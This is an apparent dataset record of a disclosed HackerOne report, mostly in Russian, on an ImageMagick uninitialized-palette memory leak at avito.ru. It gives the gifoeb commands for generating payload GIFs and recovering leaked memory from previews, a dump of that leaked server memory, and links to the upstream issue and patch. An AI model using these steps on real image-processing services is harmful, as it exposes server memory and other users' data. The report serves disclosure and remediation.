{
  "reported_to": "Avito",
  "reported_by": "kxyry ",
  "title": "[avito.ru] ImageMagick uninitialized image palette",
  "content": "\n\u041f\u0440\u0438\u0432\u0435\u0442!\n\u041f\u0440\u0438 \u043f\u043e\u0434\u0430\u0447\u0435 \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u044f \u043c\u043e\u0436\u043d\u043e \u0437\u0430\u0433\u0440\u0443\u0436\u0430\u0442\u044c \u0444\u043e\u0442\u043e\u0433\u0440\u0430\u0444\u0438\u0438. \u041e\u043d\u0438 \u043e\u0431\u0440\u0430\u0431\u0430\u0442\u044b\u0432\u0430\u044e\u0442\u0441\u044f \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0439 \u0432\u0435\u0440\u0441\u0438\u0435\u0439 ImageMagick.\n\u0414\u043b\u044f \u044d\u043a\u0441\u043f\u043b\u0443\u0430\u0442\u0430\u0446\u0438\u044f \u0437\u0430\u043f\u0443\u0441\u043a\u0430\u0435\u043c https://github.com/neex/gifoeb\n\u0413\u0435\u043d\u0435\u0440\u0438\u0440\u0443\u0435\u043c payload.\nCode 99 Bytes\n1r=640x480\n2mkdir -p for_upload &&\n3for i in `seq 1 10`; do\n4   ./gifoeb gen $r for_upload/$i.gif;\n5done\n\u0417\u0430\u0433\u0440\u0443\u0436\u0430\u0435\u043c \u043d\u0430\u0448\u0438 \u043a\u0430\u0440\u0442\u0438\u043d\u043a\u0438 \u0438\u0437 \u043f\u0440\u0435\u0432\u044c\u044e (\u0437\u0430\u043c\u0435\u043d\u0438\u0432 \u0440\u0430\u0437\u0440\u0435\u0448\u0435\u043d\u0438\u0435 \u043d\u0430 640x480), \u0432\u044b\u0433\u0440\u0443\u0436\u0430\u0435\u043c \u0440\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442 \u0432 \u043f\u0430\u043f\u043a\u0443 previews\n\u0417\u0430\u043f\u0443\u0441\u043a\u0430\u0435\u043c \u0441\u043a\u0440\u0438\u043f\u0442.\nCode 67 Bytes\n1  for p in previews/*; do\n2    ./gifoeb recover $p | strings;\n3  done\n\u0412\u0438\u0434\u0438\u043c \u043b\u0438\u043a\u0438 \u0438\u0437 \u043f\u0430\u043c\u044f\u0442\u0438. \u0418\u0437-\u0437\u0430 \u0442\u043e\u0433\u043e, \u0447\u0442\u043e \u0432 \u0440\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442\u0435 \u043e\u0431\u0440\u0430\u0431\u043e\u0442\u043a\u0438 \u043c\u044b \u043f\u043e\u043b\u0443\u0447\u0430\u0435\u043c jpeg \u0444\u043e\u0440\u043c\u0430\u0442, \u0432 \u0432\u044b\u0432\u043e\u0434\u0435 \u043c\u044b \u043c\u043e\u0436\u0435\u043c \u043f\u043e\u043b\u0443\u0447\u0438\u0442\u044c \u043e\u0448\u0438\u0431\u043a\u0438, \u043a\u043e\u0442\u043e\u0440\u044b\u0435 \u043c\u044b \u043c\u043e\u0436\u0435\u043c \u0443\u0441\u0442\u0440\u0430\u043d\u0438\u0442\u044c \u0440\u0430\u0437\u043d\u044b\u043c\u0438 \u0441\u043f\u043e\u0441\u043e\u0431\u0430\u043c\u0438.\n\u0412 \u0440\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442\u0435 \u044d\u043a\u0441\u043f\u043b\u0443\u0430\u0442\u0430\u0446\u0438\u0438 \u044f \u043f\u043e\u043b\u0443\u0447\u0438\u043b \u0441\u043b\u0435\u0434\u0443\u044e\u0449\u0438\u0439 \u043b\u0438\u043a \u043f\u0430\u043c\u044f\u0442\u0438.\nCode 1.09 KiB\n1.i{~\n2xordIarh\n3ndew.sv\n4lohin\n51_7560085\n6n`md\n7pinnd\n87:2009406p\n9.i{~\n109311c560\n11qegistratiooTine\n12sucsbrhcedNews\n13stbsbrhbddSelip\n14.i{~\n15Enails\n16isFosKnrcjteb\n17isPhbntol\n18irSobial\n19llSrbbkhog\n20creo\n21.i{~\n22#kz~\n23RELECT 11\n24TRSU\n25TRSU\n26w-data/t@\n27/khb\n2822T17:34920+13;00\n29st: /hpmf/wvw,data/tahs/auito/Ddolnz_1407090154/releard3/veodoq/cpnposer.../cpre0service-jm`ge-ttosage-cmhent/rsc/Cord/Clidntt/IlageTtorage.qhp\n30/hole/www-daua/tags/bviso0Eeploy`05/6181264/release2/vdneoq/dosd/sesvice.image-ssoragd-clienu/src0Cpre0Cmhents0ImagfTtosage.Q\n31Typd: multioart/fprm-dat`; bpundary=--------------------\n323U:94n[45\n33o\"9bf952+:3k3>D-3=e\n34vshoufN^\n35btTmZu]kuP\n366#)6-T:9>0#li&OGV*92q)4;0[k/Io_\n37szammtvOmnpO_ydQ\n38ggiOolbu_iE_\n397_^ldWqeoG\n40-QQnFhdfQt_\n41`lGfnPhsblxea\n42ktIgflund\n43knYuabWv\n44GoikBT\n45bKOk_lsyv\n46gtItayXs\n47ST_bglnX\n48#\\t^UyoVZ]iQabAldn\n49Xy^tkndWk`Y=cO\n50 xdc\n511f\\wquwlrR_p}<|jjlaeLguf\n52HXU1\n53]KUP\n54[TNn\n55:40+13;00\n56URSS\n57TRSU\n58URSS\n591/07/\n60itn.ru.ru/images/024/62/07/\n61th: 38297\n62Cpmse0\n63URSS\n64xordIarh\n65ndew.sv\n66lohin\n671_7560085\n68n`md\n69pinnd\n707:2009406p\n719311c560\n72qegistratiooTine\n73sucsbrhcedNews\n74stbsbrhbddSelip\n75Enails\n76isFosKnrcjteb\n77isPhbntol\n78irSobial\n79llSrbbkhog\n80creo\n81/hole/www-daua/s1\n\u0420\u0435\u043a\u043e\u043c\u0435\u043d\u0434\u0430\u0446\u0438\u0438\n\u041e\u0448\u0438\u0431\u043a\u0430, \u043f\u0440\u0438\u0432\u043e\u0434\u044f\u0449\u0430\u044f \u043a \u0443\u0442\u0435\u0447\u043a\u0435 \u0434\u0430\u043d\u043d\u044b\u0445 \u0438\u0437 \u043d\u0435\u0438\u043d\u0438\u0446\u0438\u0430\u043b\u0438\u0437\u0438\u0440\u043e\u0432\u0430\u043d\u043d\u043e\u0439 \u043f\u0430\u043b\u0438\u0442\u0440\u044b \u0432 ImageMagick \u043f\u043e\u0437\u0432\u043e\u043b\u044f\u0435\u0442 \u043f\u0440\u043e\u0441\u043c\u0430\u0442\u0440\u0438\u0432\u0430\u0442\u044c \u0444\u0440\u0430\u0433\u043c\u0435\u043d\u0442\u044b \u043f\u0430\u043c\u044f\u0442\u0438 \u0441\u0435\u0440\u0432\u0435\u0440\u0430. \u0412 \u044d\u0442\u043e\u043c \u043f\u0440\u043e\u0446\u0435\u0441\u0441\u0435 \u043c\u043e\u0436\u0435\u0442 \u043e\u043a\u0430\u0437\u0430\u0442\u044c\u0441\u044f \u0447\u0442\u043e-\u0442\u043e \u0438\u043d\u0442\u0435\u0440\u0435\u0441\u043d\u043e\u0435, \u043d\u0430\u043f\u0440\u0438\u043c\u0435\u0440: \u0434\u0430\u043d\u043d\u044b\u0435 \u0434\u0440\u0443\u0433\u0438\u0445 \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u0435\u0439, \u043a\u043b\u044e\u0447\u0438, \u043f\u0430\u0440\u043e\u043b\u0438 \u0438\u0442\u0434. \u041f\u043e\u044d\u0442\u043e\u043c\u0443 \u0440\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442 \u044d\u043a\u0441\u043f\u043b\u0443\u0430\u0442\u0430\u0446\u0438\u0438 \u043c\u043e\u0436\u0435\u0442 \u0431\u044b\u0442\u044c \u043e\u0447\u0435\u043d\u044c \u0441\u0435\u0440\u044c\u0451\u0437\u0435\u043d.\n\u041e\u0440\u0438\u0433\u0438\u043d\u0430\u043b\u044c\u043d\u044b\u0439 issue \u0438 \u043e\u043f\u0438\u0441\u0430\u043d\u0438\u0435 \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u0438 \u043d\u0430 \u0433\u0438\u0442\u0445\u0430\u0431\u0435 https://github.com/ImageMagick/ImageMagick/issues/592.\n\u041f\u0430\u0442\u0447, \u043a\u043e\u0442\u043e\u0440\u044b\u0439 \u0437\u0430\u043a\u0440\u044b\u0432\u0430\u0435\u0442 \u0434\u0430\u043d\u043d\u0443\u044e \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u044c https://github.com/ImageMagick/ImageMagick/commit/10aae21bf9dac47e16d8fcde7eba7f7f9d1e52f8\n\n",
  "severity": [
    9.0,
    10.0
  ],
  "bounty": null,
  "weaknesses": [
    "Memory Corruption - Generic"
  ],
  "screenshots": {},
  "disclosed_date": 1619285580,
  "report_url": "https://hackerone.com/reports/271355",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "MEDIUM",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Generate payload images using the gifoeb tool with specific dimensions (640x480)"
    ],
    [
      2,
      "Upload the generated images to the target system (avito.ru) to trigger the ImageMagick processing"
    ],
    [
      3,
      "Retrieve the processed images from the previews folder"
    ],
    [
      4,
      "Run the gifoeb tool to recover and analyze memory fragments from the processed images using the 'strings' command"
    ]
  ],
  "vuln_description": "The vulnerability involves an uninitialized image palette in ImageMagick, which leads to memory leaks when processing certain image files. This allows an attacker to extract fragments of memory from the server, potentially containing sensitive data such as user credentials or other confidential information.",
  "reason": "The attack requires knowledge of the specific ImageMagick vulnerability and the use of a specialized tool (gifoeb) to generate and analyze the payload images. The steps involve multiple components (image generation, upload, processing, and memory analysis) but are straightforward once the tool and vulnerability are known.",
  "new_complexity": "MEDIUM",
  "requires_code": false,
  "requires_CVE": true,
  "is_ctf": false,
  "other_report": null
}